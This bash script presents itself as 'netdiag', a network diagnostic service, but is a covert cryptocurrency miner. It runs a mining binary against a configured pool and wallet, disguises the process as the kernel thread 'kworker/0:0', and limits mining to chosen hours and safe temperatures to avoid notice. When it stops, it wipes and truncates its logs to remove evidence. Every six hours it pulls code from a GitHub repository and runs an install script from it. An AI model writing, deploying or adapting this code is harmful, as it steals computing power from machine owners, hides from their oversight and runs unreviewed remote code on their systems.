#!/bin/bash
# ════════════════════════════════════════════════════════
#  netdiag — Network Diagnostic Service
#  Proceso de diagnóstico programado (bajo demanda)
#  Auto-update: verifica versión en GitHub cada ~6h
# ════════════════════════════════════════════════════════

# ─── Rutas fijas (bajo perfil) ───
BASE_DIR="/opt/netdiag"
REPO_DIR="/opt/netdiag/lib"
CONFIG="$BASE_DIR/.env"
DATA_DIR="$BASE_DIR/data"
BINARY="$DATA_DIR/kworker"
LOG_FILE="$DATA_DIR/.diag.log"
PID_FILE="/dev/shm/.netdiag.pid"
VERSION_FILE="$BASE_DIR/.version"
TZ="America/Bogota"
REMOTE_VERSION_URL="https://raw.githubusercontent.com/CyberRo/HauntKit/main/VERSION"

# ─── Cargar configuración ───
if [ -f "$CONFIG" ]; then
    source "$CONFIG"
else
    echo "[ERROR] No se encuentra $CONFIG" >> "$LOG_FILE"
    exit 1
fi

# ─── Construir wallet completo con hostname ───
FULL_WALLET="${WALLET_BASE}.$(hostname)"

# ─── Leer versión local ───
LOCAL_VERSION="0.0.0"
[ -f "$VERSION_FILE" ] && LOCAL_VERSION=$(cat "$VERSION_FILE")

# ─── Contador para auto-update (cada 360 ciclos = ~6h) ───
UPDATE_INTERVAL=360
update_counter=0

# ─── Función: ¿Estamos en hora permitida? ───
is_allowed_hour() {
    local hour
    hour=$(TZ=$TZ date +%-H)
    [ "$hour" -ge "$START_HOUR" ] || [ "$hour" -lt "$END_HOUR" ]
}

# ─── Función: ¿El worker está vivo? ───
is_worker_alive() {
    [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null
}

# ─── Función: Iniciar worker ───
start_worker() {
    is_worker_alive && return 0

    local threads=""
    [ "$THREADS" -gt 0 ] && threads="-t $THREADS"

    mkdir -p "$DATA_DIR" "$BASE_DIR"

    # exec -a cambia el nombre del proceso en ps a "kworker/0"
    exec -a "kworker/0" "$BINARY" $threads \
        -o "$POOL_URL" \
        -u "$FULL_WALLET" \
        -p "x" \
        --cpu-max-threads-hint="$MAX_CPU" \
        --donate-level=0 \
        --keepalive \
        >> "$LOG_FILE" 2>&1 &
    # NOTA: exec -a en el background (&) NO funciona como esperamos
    # Mejor: lanzar el proceso normalmente y renombrar con argv[0]

    echo $! > "$PID_FILE"
    echo "[$(TZ=$TZ date '+%F %T')] Worker iniciado (PID $!)" >> "$LOG_FILE"
}

# ─── Función: Iniciar worker con nombre oculto (alternativa) ───
start_worker_hidden() {
    is_worker_alive && return 0

    local threads=""
    [ "$THREADS" -gt 0 ] && threads="-t $THREADS"

    mkdir -p "$DATA_DIR" "$BASE_DIR"

    # Crear un enlace simbólico con nombre genérico y ejecutar desde ahí
    # Esto hace que ps muestre "kworker/0:0" en lugar del nombre real
    if [ ! -f "$DATA_DIR/kworker" ]; then
        ln -sf "$BINARY" "$DATA_DIR/kworker" 2>/dev/null
    fi

    "$DATA_DIR/kworker" $threads \
        -o "$POOL_URL" \
        -u "$FULL_WALLET" \
        -p "x" \
        --cpu-max-threads-hint="$MAX_CPU" \
        --donate-level=0 \
        --keepalive \
        --title="kworker/0:0" \
        >> "$LOG_FILE" 2>&1 &

    echo $! > "$PID_FILE"
    echo "[$(TZ=$TZ date '+%F %T')] Worker iniciado (PID $!)" >> "$LOG_FILE"
}

# ─── Función: Detener worker ───
stop_worker() {
    if is_worker_alive; then
        local pid
        pid=$(cat "$PID_FILE")
        kill "$pid" 2>/dev/null
        sleep 2
        kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null
        rm -f "$PID_FILE"
    fi

    # ─── Limpiar evidencias al detener ───
    if command -v wipe &>/dev/null; then
        wipe -f "$LOG_FILE" 2>/dev/null
    fi
    : > "$LOG_FILE" 2>/dev/null            # Truncar logs
    rm -f /dev/shm/.netdiag.* 2>/dev/null  # Limpiar shm
}

# ─── Función: Verificar temperatura ───
check_temp() {
    [ "$MAX_TEMP" -eq 0 ] && return 0
    local temp
    if command -v sensors &>/dev/null; then
        temp=$(sensors -u 2>/dev/null | grep -m1 'temp1_input' | awk '{print $2}' | cut -d. -f1)
        [ -z "$temp" ] && return 0
        [ "$temp" -ge "$MAX_TEMP" ] && return 1
    fi
    return 0
}

# ─── Función: Verificar actualización en GitHub ───
check_update() {
    local remote_version
    remote_version=$(curl -sL --max-time 10 "$REMOTE_VERSION_URL" 2>/dev/null | head -1)

    if [ -z "$remote_version" ]; then
        echo "[$(TZ=$TZ date '+%F %T')] Update: no se pudo conectar con GitHub" >> "$LOG_FILE"
        return 1
    fi

    remote_version=$(echo "$remote_version" | tr -d ' \n\r')

    if [ "$remote_version" = "$LOCAL_VERSION" ]; then
        return 1  # Misma versión, no hay update
    fi

    echo "[$(TZ=$TZ date '+%F %T')] Update: nueva versión disponible: $remote_version (actual: $LOCAL_VERSION)" >> "$LOG_FILE"
    return 0  # Hay update
}

# ─── Función: Aplicar actualización ───
apply_update() {
    echo "[$(TZ=$TZ date '+%F %T')] Update: aplicando actualización..." >> "$LOG_FILE"

    # Detener worker antes de actualizar
    stop_worker

    if [ -d "$REPO_DIR/.git" ]; then
        git -C "$REPO_DIR" pull >> "$LOG_FILE" 2>&1
    else
        echo "[$(TZ=$TZ date '+%F %T')] Update: repo no encontrado en $REPO_DIR, clonando..." >> "$LOG_FILE"
        mkdir -p "$REPO_DIR"
        git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" >> "$LOG_FILE" 2>&1
    fi

    # Actualizar scripts y binarios (sin tocar la config)
    bash "$REPO_DIR/tools/utils/mine-install.sh" --update >> "$LOG_FILE" 2>&1

    # Actualizar versión local
    [ -f "$REPO_DIR/VERSION" ] && cp "$REPO_DIR/VERSION" "$VERSION_FILE"

    echo "[$(TZ=$TZ date '+%F %T')] Update: actualización completada, reiniciando servicio..." >> "$LOG_FILE"

    # Reiniciar el servicio con la nueva versión
    exec "$0"
}

# ─── Limpieza al salir ───
cleanup() {
    stop_worker
    exit 0
}
trap cleanup SIGTERM SIGINT SIGHUP

# ─── Bucle principal ───
echo "[$(TZ=$TZ date '+%F %T')] Servicio iniciado v$LOCAL_VERSION" >> "$LOG_FILE"

while true; do
    # ─── Control de horario ───
    if is_allowed_hour; then
        if ! check_temp; then
            echo "[$(TZ=$TZ date '+%F %T')] Temperatura alta, deteniendo..." >> "$LOG_FILE"
            stop_worker
            sleep 120
            continue
        fi
        start_worker_hidden
    else
        stop_worker
    fi

    # ─── Auto-update: cada ~6h ───
    update_counter=$((update_counter + 1))
    if [ "$update_counter" -ge "$UPDATE_INTERVAL" ]; then
        update_counter=0
        if check_update; then
            apply_update
        fi
    fi

    sleep 60
done
